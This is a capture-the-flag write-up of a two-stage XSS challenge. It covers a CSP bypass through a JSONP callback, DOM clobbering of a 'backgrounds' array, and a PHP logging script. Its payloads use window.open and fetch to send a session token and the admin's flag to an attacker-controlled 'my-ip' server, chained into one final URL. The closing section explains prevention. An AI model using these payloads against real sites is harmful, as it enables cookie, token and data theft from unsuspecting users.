# Stage 1
## First thoughts:
When I first visited the site, I first saw the 3 buttons which quickly turned out to do nothing interesting. Then I saw the search box and realized the input there is directly written to the URL as the `search` attribute and inserted into the  page without filtering. That's when I realized the potential for an XSS here.

## Trying to get an XSS to work
After inserting a default XSS vector `<script>alert("XSS")</script>` I realized that the CSP header is set to `Content-Security-Policy:  default-src 'self' http://*.xss.allesctf.net; object-src 'none'; base-uri 'none';`. So no chance of getting script tags to work. I started too look for alternatives and saw that there is a script executed which comes from `/items.php?cb=parseItems`. This site creates a Javascript command which executes the function which is forwarded by the `cb` attribute with a json representation of the things you can buy. So by passing `alert("XSS")//` to the site. It would create a script which would show the alert box. Also the script comes from a source which matches the CSP headers `default-src 'self' http://*.xss.allesctf.net;`, because it has the URL [http://xss.allesctf.net/items.php?cb=alert("XSS")//](http://xss.allesctf.net/items.php?cb=alert(%22XSS%22)//). Now I can just set this URL as the script `src ` and add it to the document by inserting it into the `search` attribute. SO all in all I get this [http://xss.allesctf.net/?search=<script+src=http://xss.allesctf.net/items.php?cb=alert("XSS")//></script>](http://xss.allesctf.net/?search=<script+src=http://xss.allesctf.net/items.php?cb=alert('XSS')//></script>). Now I have an XSS on Stage 1 and could execute whatever I want.

# Stage 2
## First thoughts:
Upon opening Stage 2 I saw the goal. I had to get the flag from the admin. I saw the change background function and didn't think much of it. Also I saw the CSP header `Content-Security-Policy: script-src 'nonce-WliETdBMd5Z/HQG6kbx3Hn850EQ=' 'unsafe-inline' 'strict-dynamic'; base-uri 'none'; object-src 'none';` has set a nonce. So I didn't thought a XSS is possible and though about possible Session Hijacking attacks.

## Session Hijacking:
The session is constructed by 2 factors here. The first is the token, which gets passed to the Stage 2 site. The second is the `PHPSESSID `which is provided by the request from the browser and has the `httponly `flag set.
### Getting the token
The token wasn't that hard to get. I setup an Apache Server with XAMPP and wrote a little PHP script

```
<?php
header ('Location:https://google.com');
$cookies = $_GET["c"];
$file = fopen('log.txt', 'a');
fwrite($file, $cookies . "\n\n");
?>
```
All it does is, it gets reads the parameter passed to it `c` to a local file `log.txt` and forwards the browser to google.com just to see something for testing purposes. If I now call http://my-ip/t.php?c=TEST, then TEST gets written to the log file.  So now using the XSS from Stage 1 I can get the token by setting `search=window.open("".concat("http://my-ip/t.php?c=",stage2.href))//>`.
### Getting the PHPSESSID:
Now let's get to the tricky part, getting the session cookie. The hard part is, that the cookie has set the `http-only` flag, so it isn't possible to get this cookie through JS. But then I thought maybe I can regenerate the session cookie myself. After looking into it I saw you need the current time. So I realized that the token is just the UNIX timestamp in microseconds. So I had the time, but then I saw there is also some random value from the OS inside the algorithm so I decided this wasn't the right path.

## Flag stealing
### Preparation
So the only other way to get the flag is to steal it from the admin directly. But for that I need a XSS vector. So I decided to give the CSP header a second look and realized that the `strict-dynamic` flag is set. That means, that if I could generate a script DOM object I could execute whatever I want. But if I could generate a script I also could just as well use this method to execute anything. So I looked for other things.
I noticed that the background which can be set to 3 different images is persistent between refreshes. So it probably is linked to the session.
With this knowledge I tried to use this and intercepted with Burp the request which sets the background value, so I could use Burp to set the `bg` value to whatever I want. After some testing I realized that the value is directly inserted into the value attribute  `<input type="hidden" id="bg" value="red">`. So I could just as well pass `bg=red">Hello World` and the background would be set to the red image and Hello World was printed out. That was great but I couldn't do anything useful with that.
So I searched for something else and found it inside the [backgrounds.js](http://stage2.xss.allesctf.net/static/js/background.js) file. When the browser loads the site `$("body").append(backgrounds[$("#bg").val()]);` get executed and I had control over what the value of `bg` was. But I needed control over the `backgrounds` array too. 
After looking for ways to manipulate the array without the use of JS I realized that because of the positioning of the input and the script which creates the backgrounds array, I could just comment the whole script so it doesn't get created. I remembered that HTML objects which have set an `id` can be accessed by it. So if I had `<img id="backgrounds">`, a backgrounds object would be defined. If I now also give this an attribute like `<img id="backgrounds" alt="TEST">` then it could be accessed by `backgrounds["alt"]`. Now I could set `bg=alt"><img id="backgrounds" alt="TEST"><!--` and not only TEST gets added to the file because of the alt attribute but it also gets added because of `backgrounds.js`.
Now going back to the `strict-dynamic` CSP header flag I could set the `alt=<script>alert('XSS2')</script>` and the alert gets executed.
### The flag
To steal the flag I could do the same as I had stolen the token and send the flag via `window.open` to me.
The whole was then setting `bg=alt"><img id="backgrounds" alt="<script>window.open(''.concat('http://my-ip/t.php?c='%2Bdocument.getElementsByTagName('b')[0].innerText))</script>"><!--` and the flag got send to me.
#Assembly of the exploit
I had Stage 1 and 2 figured out by now I had to think about how to set the `bg` value from Stage 1. The obstacle was that there was no cors header inside the response but luckily if I fetch, I could set `mode='no-cors'` so that the request gets send correctly but I couldn't access the response which I didn't care about. 
So by first executing `b='bg=alt%22><img+id=%22backgrounds%22alt=%22<script>window.open(%27%27.concat(%27http://my-ip/t.php?c=%27%2Bdocument.getElementsByTagName(%27b%27)[0].innerText))</script>%22><!--'` I set the variable b to the body which will get send by fetch. Because I am gonna send this I can encode this and don't have to deal with quote problems. Now execute fetch `fetch(stage2.href,{headers:{'Content-type':'application/x-www-form-urlencoded'},method:'POST',credentials:'include',mode:'no-cors',body:b})` which will send the body and finally open Stage 2. I have to open Stage 2 after the request got send. So I just wait 3 seconds and then call `stage2.click()` or with the wait `setTimeout(function(){stage2.click();},3000)`. This opens the Stage 2 site which sends the flag to my server.
The last step is now to assemble a single URL which I can open to send the flag to my server. Because the XSS I found on Stage 1 has a character limit of 250 I have to split the script. Luckily I already have a nice split. The first script sets the body variable and the second executes the whole thing.

`
http://xss.allesctf.net/?search="<script src=items.php?cb=b='bg=alt%252522%25253E%25253Cimg%2Bid=%2522backgrounds%2522alt=%2522%25253Cscript%25253Ewindow.open(%252527%252527.concat(%252527http://my-ip/t.php?c=%252527%25252Bdocument.getElementsByTagName(%252527b%252527)[0].innerText))%25253C/script%25253E%252522%25253E%25253C!--'//></script><script src=items.php?cb=fetch(stage2.href,{headers:{'Content-type':'application/x-www-form-urlencoded'},method:'POST',credentials:'include',mode:'no-cors',body:b});setTimeout(function(){stage2.click();},3000);//>
`

That's the final URL I have encoded some quotes in the b variable multiple times so they don't collide with other quotes. In the end I can now send this URL to the admin via the [submit] page (http://submit.xss.allesctf.net/), wait 3 seconds and get the flag inside the log.txt file.

# Prevention
The big problem here is like so often that the user input doesn't get sanitized correctly. Like the fact that I could insert whatever I want in Stage 2 for the `bg ` value. Or in Stage 1 everything got inserted unescaped what was searched for. The second problem is the `items.php` file. There is no reason to use JSONP in this context because in the intended way it would be static.
If both user inputs got sanitized or escaped correctly and the `items.php` file got replaced by a static JSON then the site wouldn't have a way to steal the flag.